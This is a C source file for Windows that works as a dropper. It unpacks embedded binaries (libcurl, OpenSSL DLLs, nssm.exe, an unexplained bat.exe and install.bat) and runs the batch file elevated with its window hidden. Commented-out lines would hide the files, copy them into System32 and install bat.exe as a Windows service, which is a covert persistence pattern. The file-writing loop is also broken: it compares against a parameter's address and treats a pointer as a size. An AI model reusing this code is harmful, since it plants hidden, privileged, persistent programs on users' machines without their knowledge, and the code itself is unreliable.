#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

/*

ld -r -b binary -o data.o data.txt
rem ld -r -b binary -o binary.o input.txt --leading-underscore
rem objcopy -I binary -O elf32-i386 -B i386 data.txt data.o
gcc -o main.exe main.c data.o
main.exe
pause

*/

/*
ld -r -b binary -o libcurl.o libcurl.dll
*/
extern char binary_libcurl_dll_start;
extern char binary_libcurl_dll_end;
extern char binary_libcurl_dll_size;

/*
ld -r -b binary -o nssm.o nssm.exe
*/
extern char binary_nssm_exe_start;
extern char binary_nssm_exe_end;
extern char binary_nssm_exe_size;

/*
ld -r -b binary -o bat.o bat.exe
*/
extern char binary_bat_exe_start;
extern char binary_bat_exe_end;
extern char binary_bat_exe_size;

/*
ld -r -b binary -o libssl32.o libssl32.dll
*/
extern char binary_libssl32_dll_start;
extern char binary_libssl32_dll_end;
extern char binary_libssl32_dll_size;

/*
ld -r -b binary -o libeay32.o libeay32.dll
*/
extern char binary_libeay32_dll_start;
extern char binary_libeay32_dll_end;
extern char binary_libeay32_dll_size;

/*
ld -r -b binary -o install.o install.bat
*/
extern char binary_install_bat_start;
extern char binary_install_bat_end;
extern char binary_install_bat_size;

// 释放当前 exe 中的资源并按照指定名称形成文件 
void release(char *start, char *end, char* size, char *filename)
{
	char *p = start;
	FILE *fp = NULL;
	fp = fopen(filename, "w+b");
	while (p != &end && size > 0)
	{
		fputc(*p++, fp);
		size --;
	}
	fclose(fp);
}

int main()
{
	release(&binary_libeay32_dll_start, &binary_libeay32_dll_end, &binary_libeay32_dll_size, "libeay32.dll");
	release(&binary_libssl32_dll_start, &binary_libssl32_dll_end, &binary_libssl32_dll_size, "libssl32.dll");
	release(&binary_libcurl_dll_start, &binary_libcurl_dll_end, &binary_libcurl_dll_size, "libcurl.dll");
	release(&binary_nssm_exe_start, &binary_nssm_exe_end, &binary_nssm_exe_size, "nssm.exe");
	release(&binary_bat_exe_start, &binary_bat_exe_end, &binary_bat_exe_size, "bat.exe");
	release(&binary_install_bat_start, &binary_install_bat_end, &binary_install_bat_size, "install.bat");
//	SetFileAttributes("nssm.exe", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN);
//	SetFileAttributes("libcurl.dll", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN);
//	SetFileAttributes("bat.exe", FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_HIDDEN);
	
//	ShellExecute(0, "runas", "move nssm.exe %windir%\\System32\\", "", "", SW_HIDE);
//	ShellExecute(0, "runas", "move libcurl.dll %windir%\\System32\\", "", "", SW_HIDE);
//	ShellExecute(0, "runas", "move libssl32.dll %windir%\\System32\\", "", "", SW_HIDE);
//	ShellExecute(0, "runas", "move libeay32.dll %windir%\\System32\\", "", "", SW_HIDE);
//	ShellExecute(0, "runas", "move bat.exe %windir%\\System32\\", "", "", SW_HIDE);
//	Sleep(2000);
//	ShellExecute(0, "runas", "%windir%\\System32\\nssm.exe install bat %windir%\\System32\\bat.exe", "", "", SW_HIDE);
//	ShellExecute(0, "runas", "net start bat", "", "", SW_HIDE);

	ShellExecute(0, "runas", "install.bat", "", "", SW_HIDE);

	return 0;
}
